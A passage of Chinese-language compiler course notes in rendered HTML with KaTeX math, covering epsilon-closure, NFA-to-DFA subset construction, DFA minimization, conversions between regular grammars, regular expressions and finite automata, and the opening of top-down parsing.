encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>闭包:从一个结点出发，经过任意<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>边所能到达集合</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">I_a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>子集：由<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>的状态出发，经过一条<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>弧，(跳过<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>弧前的任意<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>弧)可到达的状态的集合称为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>J</mi></mrow><annotation encoding="application/x-tex">J</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>a</mi></msub><mo>=</mo><mi>ϵ</mi><mo>−</mo><mi>C</mi><mi>L</mi><mi>O</mi><mi>S</mi><mi>U</mi><mi>R</mi><mi>E</mi><mo stretchy="false">(</mo><mi>J</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I_a=\epsilon-CLOSURE(J)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em;">OS</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.05764em;">RE</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mclose">)</span></span></span></span></eq></li><li>利用子集法构造确定地有穷自动机DFA</li></ol><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%AD%90%E9%9B%86%E6%B3%95.jpg" alt="子集法"><br>举例：<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%AD%90%E9%9B%86%E6%B3%95%E4%BE%8B%E5%AD%901.jpg" alt><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%AD%90%E9%9B%86%E6%B3%95%E4%BE%8B%E5%AD%902.jpg" alt></p><h4 id="dfa%E7%9A%84%E6%9C%80%E5%B0%8F%E5%8C%96" tabindex="-1">DFA的最小化</h4><ul><li><p>寻找一个状态数不比<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>更多的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>F</mi><mi>A</mi><mi>M</mi><mtext>ˊ</mtext></mrow><annotation encoding="application/x-tex">DFA Mˊ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">ˊ</span></span></span></span></eq>，使得<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mtext>ˊ</mtext></mrow><annotation encoding="application/x-tex">Mˊ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">ˊ</span></span></span></span></eq>所识别的符号串相同，即<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><mi>M</mi><mtext>ˊ</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(M)=L(Mˊ)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">ˊ</span><span class="mclose">)</span></span></span></span></eq>。</p><ul><li><ol><li>构造状态集的划分</li></ol></li><li><ol start="2"><li>取每一组中的一个状态作代表</li></ol></li><li><ol start="3"><li>删去多余死状态</li></ol></li></ul></li><li><p>DFA最小化的关键在于把它的状态集分成一些两两互不相交的子集，使得任何两个不同的子集中的状态都是可区别的，而同一子集中的任何两个状态都是等价的。</p></li><li><p>基本思想：如果从状态 p 出发能识别某一符号串 α 而停止于终态，那么从q 出发也能识别 α 而停止于终态；反之亦然。则称状态p 和 q 是等价的。如果 p 和 q 不等价，则说 p 和 q 是可区分的。</p></li><li><p>具体方法：</p><ul><li>对已有划分的每个子集进行如下分解，直到不再有新子集产生<ul><li>分解后的两个状态 p 和 q 属于同一个子集，当且仅当<eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 20: …all a \in \sum $̲，" style="color:#cc0000">\forall a \in \sum $，</span></eq>t( p, a )<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>和</mtext></mrow><annotation encoding="application/x-tex">和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">和</span></span></span></span></eq>t( q, a )$都到达当前划分的同一子集中</li></ul></li><li><ol><li>构造状态集的划分(初次划分为终点节点和其它节点)</li></ol></li><li><ol start="2"><li>取每一组中的一个状态作代表</li></ol></li><li><ol start="3"><li>删去多余死状态</li></ol></li></ul></li></ul><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/DFA%E5%8C%96%E7%AE%80%E4%BE%8B%E5%AD%90.jpg" alt="DFA化简例子"></p><h3 id="4-%E6%AD%A3%E8%A7%84%E6%96%87%E6%B3%95%E4%B8%8Efa" tabindex="-1">4 正规文法与FA</h3><ul><li>右线性正规文法构造等价<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">FA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span></span></span></span></eq><ul><li>令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的终结符号集为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的字母表；</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的非终结符号作为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的状态，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的开始符号为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的开始状态；</li><li>增加一个终止状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi><mo stretchy="false">(</mo><mi>Z</mi><mo mathvariant="normal">∉</mo><msub><mi>V</mi><mi>N</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Z(Z\notin V_N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord"><span class="mrel">∈</span></span><span class="mord vbox"><span class="thinbox"><span class="llap"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="inner"><span class="mord"><span class="mord">/</span><span class="mspace" style="margin-right:0.0556em;"></span></span></span><span class="fix"></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li><li>形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><mi>a</mi><mi>W</mi></mrow><annotation encoding="application/x-tex">U→aW</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">aW</span></span></span></span></eq>的规则，引一条从状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></eq>的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>弧。</li><li>形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">U→a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>的规则，引一条从状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>到终止状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq>的标记为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>的弧；</li><li>例子：<img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%8F%B3%E7%BA%BF%E6%80%A7%E6%AD%A3%E8%A7%84%E6%96%87%E6%B3%95%E5%88%B0FA.jpg" alt="右线性正规文法到FA"></li></ul></li><li>左线性正规文法构造等价<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">FA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span></span></span></span></eq><ul><li>令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的终结符号集为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的字母表；</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的非终结符号作为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的状态，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的开始符号为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的终止状态；</li><li>增加一个开始状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo mathvariant="normal">∉</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">S\notin V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord"><span class="mrel">∈</span></span><span class="mord vbox"><span class="thinbox"><span class="llap"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="inner"><span class="mord"><span class="mord">/</span><span class="mspace" style="margin-right:0.0556em;"></span></span></span><span class="fix"></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><mi>W</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">U→Wa</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">Wa</span></span></span></span></eq>的规则，引一条从状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></eq>到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>弧。</li><li>形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">U→a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>的规则，引一条从开始状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>到状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>的标记为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>的弧；</li><li>例子：<img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%B7%A6%E7%BA%BF%E6%80%A7%E6%AD%A3%E8%A7%84%E6%96%87%E6%B3%95%E5%88%B0FA.jpg" alt="左线性正规文法到FA"></li></ul></li></ul><h3 id="5-%E6%AD%A3%E8%A7%84%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8Efa" tabindex="-1">5 正规表达式与FA</h3><ul><li>正规表达式到FA：<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%AD%A3%E8%A7%84%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%88%B0FA.jpg" alt="正规表达式到FA"></li><li>FA到正规表达式<ul><li><ol><li>创建一个起始节点S连向起始点，将所有的终点连接一个节点Z</li></ol></li><li><ol start="2"><li>随后依次去掉中间节点</li></ol></li><li><ol start="3"><li>直到最后只剩开始节点和结束节点</li></ol></li><li>例子<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE1.jpg" alt="FA到RE1"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE2.jpg" alt="FA到RE2"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE3.jpg" alt="FA到RE3"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE4.jpg" alt="FA到RE4"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE5.jpg" alt="FA到RE5"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE6.jpg" alt="FA到RE6"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE7.jpg" alt="FA到RE7"></li></ul></li></ul><h2 id="4(1)%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">4(1)语法分析</h2><h3 id="1-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">1 自上而下语法分析</h3><h4 id="%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">自上而下语法分析的基本思想</h4><ul><li>推导——从开始/识别符号出发不断建立直接推导，试图构造一个最左推导序列，最终由它推导出与输入符号串相同的符号串</li><li>程序翻译——从语言文法的开始符号——&lt;程序&gt;出发，试图推导出文法的句子——源程序/与其等价的单词串</li><li>语法树——以开始/识别符号为根结点，试图向下构造一棵语法树，其末端结点符号串与输入符号串相同</li></ul><h4 